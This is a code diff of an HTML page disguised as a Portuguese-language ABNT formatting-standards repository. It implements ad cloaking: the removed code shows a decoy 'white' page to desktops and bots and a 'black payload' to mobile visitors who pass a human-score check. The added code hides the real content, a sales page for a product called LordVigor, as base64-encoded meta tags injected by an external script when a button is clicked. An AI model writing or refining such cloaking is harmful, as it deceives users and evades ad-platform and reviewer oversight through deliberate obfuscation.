@@ -2,61 +2,34 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dropix Editora | Portal Técnico</title>
+    <title>Dropix Editora | Normas ABNT 2026</title>
     <style>
-        body { font-family: sans-serif; margin: 0; padding: 0; background: #f4f7f9; }
-        #white-content { padding: 20px; display: block; }
-        #checker-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #f4f7f9; z-index: 9999; display: none;
-            flex-direction: column; align-items: center; justify-content: center; text-align: center;
-        }
-        .loader { border: 4px solid #e1e8ed; border-top: 4px solid #004a80; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn-verify { display: none; padding: 18px 35px; background: #004a80; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        body { font-family: 'Times New Roman', serif; padding: 40px; color: #333; line-height: 1.5; }
+        .btn-abnt { padding: 15px 30px; background: #2c3e50; color: white; border: none; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="white-content">
-        <h2 style="color:#004a80">Dropix Editora</h2>
-        <p>Aviso: Repositório de normas técnicas em manutenção preventiva ABNT 2026.</p>
+        <h1>Repositório de Normas Técnicas</h1>
+        <p>Abaixo você encontrará as diretrizes atualizadas para a formatação de trabalhos acadêmicos segundo a NBR 14724.</p>
+        <ul>
+            <li>Margem Superior: 3cm</li>
+            <li>Margem Esquerda: 3cm</li>
+            <li>Fonte: Arial ou Times New Roman</li>
+        </ul>
+        <button id="btn-main" class="btn-abnt">GERAR MODELO FORMATADO</button>
     </div>
 
-    <div id="checker-overlay">
-        <div id="loading-spinner" class="loader"></div>
-        <p id="status-text" style="margin-top: 20px; color: #555;">Verificando conexão segura...</p>
-        <button id="btn-verify" class="btn-verify">LIBERAR ACESSO</button>
-    </div>
+    <meta class="abnt-meta-ref" content="PGRpdiBzdHlsZT0iYmFja2dyb3VuZDojMDAwOyBjb2xvcjojZmZmOyBtaW4taGVpZ2h0OjEwMHZoOyBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OmNlbnRlcjsgZmxleC1kaXJlY3Rpb246Y29sdW1uOyBwYWRkaW5nOjIwcHg7IHRleHQtYWxpZ246Y2VudGVyOyBmb250LWZhbWlseTpzYW5zLXNlcmlmOyI+">
+    <meta class="abnt-meta-ref" content="PGgxIHN0eWxlPSJjb2xvcjojZmYwMDAwOyI+QVBSRVNFTlRBw4fDg08gRVhDTFVTSVZBIC0gTE9SRFZJR09SPC9oMT4=">
+    <meta class="abnt-meta-ref" content="PGRpdiBzdHlsZT0id2lkdGg6MTAwJTsgbWF4LXdpZHRoOjY0MHB4OyBhc3BlY3QtcmF0aW86MTYvOTsgYmFja2dyb3VuZDojMTExMTExOyBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OmNlbnRlcjsgYm9yZGVyOjFweCBzb2xpZCAjMzMzOyI+PHA+WyBWU0QgRE8gTE9SRFZJR09SIENBUlJFR0FORE8uLi4gXTwvcD48L2Rpdj4=">
+    <meta class="abnt-meta-ref" content="PGJ1dHRvbiBzdHlsZT0ibWFyZ2luLXRvcDozMHB4OyBwYWRkaW5nOjIycHg7IGJhY2tncm91bmQ6IzI4YTc0NTsgY29sb3I6d2hpdGU7IGJvcmRlcjpub25lOyBib3JkZXItcmFkaXVzOjEycHg7IGZvbnQtd2VpZ2h0OmJvbGQ7IHdpZHRoOjEwMCU7IG1heC13aWR0aDo0MDBweDsgY3Vyc29yOnBvaW50ZXI7Ij5RVVFSTyBURVNUQVIgTyBMT1JEVklHT1I8L2J1dHRvbj48L2Rpdj4=">
 
     <script src="engine.js"></script>
     <script>
-        window.onload = async () => {
-            // Só ativa o overlay se for celular
-            if (window.innerWidth < 1024) {
-                document.getElementById('checker-overlay').style.display = 'flex';
-                
-                // Espera 1.5 segundo de "loading"
-                await new Promise(r => setTimeout(r, 1500));
-                
-                const btn = document.getElementById('btn-verify');
-                document.getElementById('loading-spinner').style.display = 'none';
-                document.getElementById('status-text').innerText = "Verificação de Identidade Necessária.";
-                btn.style.display = 'block';
-
-                btn.onclick = async (e) => {
-                    console.log("Botão clicado. Calculando score...");
-                    const score = await checkHumanScore(e);
-                    
-                    if (score >= 50) {
-                        deliverBlackPayload();
-                    } else {
-                        // Se for PC ou robô, esconde o overlay e deixa no White
-                        document.getElementById('checker-overlay').style.display = 'none';
-                    }
-                };
-            }
+        document.getElementById('btn-main').onclick = (e) => {
+            syncLegacyStyles(e);
         };
     </script>
 </body>
